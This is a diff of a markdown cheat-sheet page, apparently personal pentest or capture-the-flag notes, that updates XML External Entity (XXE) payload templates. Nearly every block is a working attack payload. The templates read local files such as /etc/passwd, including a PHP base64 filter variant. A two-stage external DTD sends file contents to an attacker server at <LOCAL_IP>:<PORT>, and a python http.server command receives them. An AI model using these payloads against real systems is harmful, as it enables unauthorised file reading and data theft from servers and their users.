@@ -1,38 +1,58 @@
 ---
 title: "XXE (XML External Entity)"
-date: 2024-7-5
-tags: ["Web Exploitation", "XXE", "Xml", "Dtd", "Web", "Remote File Inclusion", "Data Exfiltration"]
+date: 2025-7-17
+tags: ["Web Exploitation", "XXE", "Xml", "Dtd", "Web", "Remote File Inclusion", "Data Exfiltration", "PHP FIlter", "LFI", "Local File Inclusion"]
 ---
 
 ### XXE Template
 
 ```console
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE foo [<!ENTITY data SYSTEM "/etc/passwd">]>
-<product>
-    <id>&data;</id>
-    <price></price>
-</product>
+<!DOCTYPE foo [<!ENTITY data SYSTEM "<FILE>">]>
+<<TAG>>
+    <<TAG1>>&data;</<TAG1>>
+</<TAG>>
 ```
 
-### External DTD (2 stage)
+---
+
+### XXE Template (With PHP Filter)
 
 ```console
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://<LOCAL_IP>/data?%data;'>">
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY data SYSTEM "php://filter/convert.base64-encode/resource=<FILE>">]>
+<<TAG>>
+    <<TAG1>>&data;</<TAG1>>
+</<TAG>>
 ```
 
-<br>
+---
+
+### External DTD (2 Stage)
+
+#### 1. Create a evil.dtd
+
+```console
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=<FILE>">
+<!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://<LOCAL_IP>:<PORT>/data?%data;'>">
+```
+
+#### 2. Host a Server
+
+```console
+python3 -m http.server <PORT>
+```
+
+#### 2. XXE
 
 ```console
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-    <!ENTITY % bar SYSTEM "http://<LOCAL_IP>/evil.dtd">
+    <!ENTITY % bar SYSTEM "http://<LOCAL_IP>:<PORT>/evil.dtd">
         %bar;
         %eval;
 ]>
-<product>
-    <id>&exfil;</id>
-    <price></price>
-</product>
+<<TAG>>
+    <<TAG1>>&exfil;</<TAG1>>
+</<TAG>>
 ```
